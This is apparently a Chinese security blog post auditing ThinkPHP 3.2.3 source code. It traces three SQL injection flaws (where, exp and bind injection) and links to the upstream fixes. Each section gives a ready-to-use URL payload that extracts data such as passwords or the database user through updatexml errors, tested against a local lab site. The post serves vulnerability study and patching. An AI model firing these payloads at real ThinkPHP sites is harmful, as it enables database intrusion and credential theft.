---
title: "Thinkphp3 漏洞总结"
date: 2019-11-27T21:22:13+08:00
draft: false
tags: ['thinkphp','代码审计']
categories: ['代码审计']
series:
- ThinkPHP
---

先总结thinkphp3的漏洞

<!--more-->

## 写在前文

- [Thinkphp3 开发手册](https://www.kancloud.cn/manual/thinkphp/1678)
- [Thinkphp3.2.3 安全开发须知](https://xz.aliyun.com/t/2630)
- [ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法](https://www.cnblogs.com/kenshinobiy/p/9165662.html)

## thinkphp3.2.3 where注入
### 基础
thinkphp3版本路由格式 
```
http://php.local/thinkphp3.2.3/index.php/Home/Index/index/id/1
                                模块/控制器/方法/参数
```
还可以用
```
http://php.local/thinkphp3.2.3/index.php?s=Home/Index/index/id/1
```
具体移步 https://www.kancloud.cn/manual/thinkphp/1711

thinkphp内置了几种方法，比如I()，M()等等
```
A 快速实例化Action类库
B 执行行为类
C 配置参数存取方法
D 快速实例化Model类库
F 快速简单文本数据存取方法
L 语言参数存取方法
M 快速高性能实例化模型
R 快速远程调用Action类方法
S 快速缓存存取方法
U URL动态生成和重定向方法
W 快速Widget输出方法
```
具体看 `ThinkPHP/Common/functions.php`
### 配置环境
首先配置好数据库
ThinkPHP/Conf/convention.php
```php
/* 数据库设置 */
'DB_TYPE'                => 'mysql', // 数据库类型
'DB_HOST'                => 'localhost', // 服务器地址
'DB_NAME'                => 'thinkphp', // 数据库名
'DB_USER'                => 'root', // 用户名
'DB_PWD'                 => 'root', // 密码
'DB_PORT'                => '3306', // 端口
```
![image](https://y4er.com/img/uploads/20191127223938.jpg)
然后访问 http://php.local/thinkphp3.2.3/ 会自动生成模块，当前目录结构
<details>
<summary>太多了，展开查看</summary>
```
PS E:\code\php\thinkphp\thinkphp3.2.3> tree
卷 文档 的文件夹 PATH 列表
卷序列号为 DA18-EBFA
E:.
├─.idea
├─Application            应用目录
│  ├─Common           公共模块
│  │  ├─Common
│  │  └─Conf
│  ├─Home                首页模块
│  │  ├─Common
│  │  ├─Conf
│  │  ├─Controller
│  │  ├─Model
│  │  └─View
│  └─Runtime             运行时
│      ├─Cache
│      │  └─Home
│      ├─Data
│      ├─Logs
│      │  └─Home
│      └─Temp
├─Public
└─ThinkPHP             核心
    ├─Common
    ├─Conf
    ├─Lang
    ├─Library
    │  ├─Behavior
    │  ├─Org
    │  │  ├─Net
    │  │  └─Util
    │  ├─Think
    │  │  ├─Cache
    │  │  │  └─Driver
    │  │  ├─Controller
    │  │  ├─Crypt
    │  │  │  └─Driver
    │  │  ├─Db
    │  │  │  └─Driver
    │  │  ├─Image
    │  │  │  └─Driver
    │  │  ├─Log
    │  │  │  └─Driver
    │  │  ├─Model
    │  │  ├─Session
    │  │  │  └─Driver
    │  │  ├─Storage
    │  │  │  └─Driver
    │  │  ├─Template
    │  │  │  ├─Driver
    │  │  │  └─TagLib
    │  │  ├─Upload
    │  │  │  └─Driver
    │  │  │      ├─Bcs
    │  │  │      └─Qiniu
    │  │  └─Verify
    │  │      ├─bgs
    │  │      └─zhttfs
    │  └─Vendor
    │      ├─Boris
    │      ├─EaseTemplate
    │      ├─Hprose
    │      ├─jsonRPC
    │      ├─phpRPC
    │      │  ├─dhparams
    │      │  └─pecl
    │      │      └─xxtea
    │      │          └─test
    │      ├─SmartTemplate
    │      ├─Smarty
    │      │  ├─plugins
    │      │  └─sysplugins
    │      ├─spyc
    │      │  ├─examples
    │      │  ├─php4
    │      │  └─tests
    │      └─TemplateLite
    │          └─internal
    ├─Mode                  模型
    │  ├─Api
    │  ├─Lite
    │  └─Sae
    └─Tpl
```
</details>

### 配置控制器
Application/Home/Controller/IndexController.class.php
```php
public function index()
{
$data = M('users')->find(I('GET.id'));
var_dump($data);
}
```
![image](https://y4er.com/img/uploads/20191127224711.jpg)

### payload
```
http://php.local/thinkphp3.2.3/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```
### 分析
当我们简单传入`id=1'`时，跟着走一遍

`I()`函数中获取参数，会经过`ThinkPHP/Common/functions.php:391` `htmlspecialchars()`进行处理，最后在`ThinkPHP/Common/functions.php:442`回调`think_filter`函数进行过滤
```php
function think_filter(&$value)
{
    // TODO 其他安全过滤

    // 过滤查询特殊字符
    if (preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
        $value .= ' ';
    }
}
```
然后进入`ThinkPHP/Library/Think/Model.class.php:779`的`find()`方法，又会经过`ThinkPHP/Library/Think/Model.class.php:811` `_parseOptions()`方法
![image](https://y4er.com/img/uploads/20191127220223.jpg)
到这我们的id还是为`1'`的
![image](https://y4er.com/img/uploads/20191127226415.jpg)
跟进`_parseOptions()` `ThinkPHP/Library/Think/Model.class.php:681`
其中有类型验证`_parseType()`函数
```php
// 字段类型验证
if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) {
    // 对数组查询条件进行字段类型检查
    foreach ($options['where'] as $key => $val) {
        $key = trim($key);
        if (in_array($key, $fields, true)) {
            if (is_scalar($val)) {
                $this->_parseType($options['where'], $key);
            }
        } elseif (!is_numeric($key) && '_' != substr($key, 0, 1) && false === strpos($key, '.') && false === strpos($key, '(') && false === strpos($key, '|') && false === strpos($key, '&')) {
            if (!empty($this->options['strict'])) {
                E(L('_ERROR_QUERY_EXPRESS_') . ':[' . $key . '=>' . $val . ']');
            }
            unset($options['where'][$key]);
        }
    }
}
```
**如果满足if条件则进入** `ThinkPHP/Library/Think/Model.class.php:737`
```php
protected function _parseType(&$data, $key)
{
    if (!isset($this->options['bind'][':' . $key]) && isset($this->fields['_type'][$key])) {
        $fieldType = strtolower($this->fields['_type'][$key]);
        if (false !== strpos($fieldType, 'enum')) {
            // 支持ENUM类型优先检测
        } elseif (false === strpos($fieldType, 'bigint') && false !== strpos($fieldType, 'int')) {
            $data[$key] = intval($data[$key]);
        } elseif (false !== strpos($fieldType, 'float') || false !== strpos($fieldType, 'double')) {
            $data[$key] = floatval($data[$key]);
        } elseif (false !== strpos($fieldType, 'bool')) {
            $data[$key] = (bool) $data[$key];
        }
    }
}
```
在这他把id进行了强制类型转换，然后返回给`_parseOptions()`，最终带入`$this->db->select($options)`进行查询避免了注入问题。

理一下 传入`id=1'` -> `I()` -> `find()` -> `_parseOptions()` -> `_parseType()` 然后将我们的字符串清理了。
要知道id参数被改变的时间点在`_parseType()`中，那进入这个方法要满足
```php
if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join']))
```
所以传入`index.php?id[where]=3 and 1=1`就可以注入了
### 修复
https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04
![image](https://y4er.com/img/uploads/20191127224820.jpg)

`v3.2.4`将`$options`和`$this->options`进行了区分，从而传入的参数无法污染到`$this->options`，也就无法控制sql语句了。

## thinkphp 3.2.3 exp注入
### payload
![image](https://y4er.com/img/uploads/20191127227978.jpg)
```
http://php.local/thinkphp3.2.3/index.php?username[0]=exp&username[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)
```
### 环境
```php
public function index()
{
    $User = D('Users');
    $map = array('username' => $_GET['username']);
    // $map = array('username' => I('username'));
    $user = $User->where($map)->find();
    var_dump($user);
}
```
我们使用全局数组传参，而不是`I()`函数。下文会解释
### 分析
打断点分析，`find()`函数会执行到`ThinkPHP/Library/Think/Model.class.php:822`的`$this->db->select($options)`
```php
public function select($options = array())
{
    $this->model = $options['model'];
    $this->parseBind(!empty($options['bind']) ? $options['bind'] : array());
    $sql    = $this->buildSelectSql($options);
    $result = $this->query($sql, !empty($options['fetch_sql']) ? true : false);
    return $result;
}
```
然后跟进`buildSelectSql()`
```php
public function buildSelectSql($options = array())
{
    if (isset($options['page'])) {
        // 根据页数计算limit
        list($page, $listRows) = $options['page'];
        $page                  = $page > 0 ? $page : 1;
        $listRows              = $listRows > 0 ? $listRows : (is_numeric($options['limit']) ? $options['limit'] : 20);
        $offset                = $listRows * ($page - 1);
        $options['limit']      = $offset . ',' . $listRows;
    }
    $sql = $this->parseSql($this->selectSql, $options);
    return $sql;
}
```
跟进`$this->parseSql()`到
```php
public function parseSql($sql, $options = array())
{
    $sql = str_replace(
        array('%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'),
        array(
            $this->parseTable($options['table']),
            $this->parseDistinct(isset($options['distinct']) ? $options['distinct'] : false),
            $this->parseField(!empty($options['field']) ? $options['field'] : '*'),
            $this->parseJoin(!empty($options['join']) ? $options['join'] : ''),
            $this->parseWhere(!empty($options['where']) ? $options['where'] : ''),
            $this->parseGroup(!empty($options['group']) ? $options['group'] : ''),
            $this->parseHaving(!empty($options['having']) ? $options['having'] : ''),
            $this->parseOrder(!empty($options['order']) ? $options['order'] : ''),
            $this->parseLimit(!empty($options['limit']) ? $options['limit'] : ''),
            $this->parseUnion(!empty($options['union']) ? $options['union'] : ''),
            $this->parseLock(isset($options['lock']) ? $options['lock'] : false),
            $this->parseComment(!empty($options['comment']) ? $options['comment'] : ''),
            $this->parseForce(!empty($options['force']) ? $options['force'] : ''),
        ), $sql);
    return $sql;
}
```
这部分是通过`parse`系列函数来构建SQL语句，我们的关注点在`parseWhere()`函数，跟进到
`ThinkPHP/Library/Think/Db/Driver.class.php:586`的 `parseWhereItem()`
![image](https://y4er.com/img/uploads/20191127224206.jpg)
关键点就在于
```php
elseif ('bind' == $exp) {
    // 使用表达式
    $whereStr .= $key . ' = :' . $val[1];
} elseif ('exp' == $exp) {
    // 使用表达式
    $whereStr .= $key . ' ' . $val[1];
}
```
在exp的那个elseif语句中把`where`条件直接用点拼接，造成SQL注入。让我们来分析下怎么进入到这个语句块，首先在`parseWhere()`中是肯定会进入`parseWhereItem()`方法中，这是无可厚非的。再来看
![image](https://y4er.com/img/uploads/20191127220531.jpg)
要满足$val是数组，并且索引为0的值为字符串'exp'，那么就可以拼接sql语句了。所以我们传入`username[0]=exp&username[1]==1 and aaa`
细心的同学会发现bind也是拼接的，下文分析。

然后我们来说下为什么**不用**`I()`函数来获取参数，而使用原生超全局数组。在`I()`函数中，最后回调了一个`think_filter()`函数
```php
is_array($data) && array_walk_recursive($data, 'think_filter');
```
```php
function think_filter(&$value)
{
    // TODO 其他安全过滤

    // 过滤查询特殊字符
    if (preg_match('/^(NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
        $value .= ' ';
    }
}
```
可以看到过滤了EXP字符串，会在后面拼接上一个空格，那这样后面`parseWhereItem()`中就不满足条件抛出异常导致无法注入。
### 修复
使用`I()`函数代替超全局数组获取变量

## thinkphp 3.2.3 bind注入
上文中写到了exp注入，这篇讲bind注入
### payload
```
http://php.local/thinkphp3.2.3/index.php?id[0]=bind&id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&password=1
```
这里需要注意`id[1]=0`原理在下面说
### 搭建环境
```php
public function index()
{
    $User = M("Users");
    $user['id'] = I('id');
    $data['password'] = I('password');
    $valu = $User->where($user)->save($data);
    var_dump($valu);
}
```
输入payload，为了讲解上文中`id[1]=0`的原理，我们输入payload
```
http://php.local/thinkphp3.2.3/index.php?id[0]=bind&id[1]=aa&password=1
```
报错
![image](https://y4er.com/img/uploads/20191127226427.jpg)

打断点在save()函数
![image](https://y4er.com/img/uploads/20191127229947.jpg)

跟进后进入update()函数`ThinkPHP/Library/Think/Db/Driver.class.php:983`
![image](https://y4er.com/img/uploads/20191127222851.jpg)

可以看到经过了`parseWhere()`，那么根据上文我们分析过的exp注入，知道还有一个`bind`注入，所以传入`id[0]=bind&id[1]=aa`然后我们的sql语句就变为

![image](https://y4er.com/img/uploads/20191127226085.jpg)

可以看到多了个冒号，在哪里替换了这个冒号？我们进入到 
`ThinkPHP/Library/Think/Db/Driver.class.php:207`的`execute()`
```php
if (!empty($this->bind)) {
    $that           = $this;
    $this->queryStr = strtr($this->queryStr, array_map(function ($val) use ($that) { return '\'' . $that->escapeString($val) . '\'';}, $this->bind));
}
```
这几行就是替换操作，是将`:0`替换为外部传进来的字符串，所以我们让我们的参数也等于0，这样就拼接了一个`:0`，然后会通过`strtr()`被替换为1，这样sql语句就通顺了。

![image](https://y4er.com/img/uploads/20191127227308.jpg)

### 修复
https://github.com/top-think/thinkphp/commit/7e47e34af72996497c90c20bcfa3b2e1cedd7fa4

![image](https://y4er.com/img/uploads/20191127228454.jpg)


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**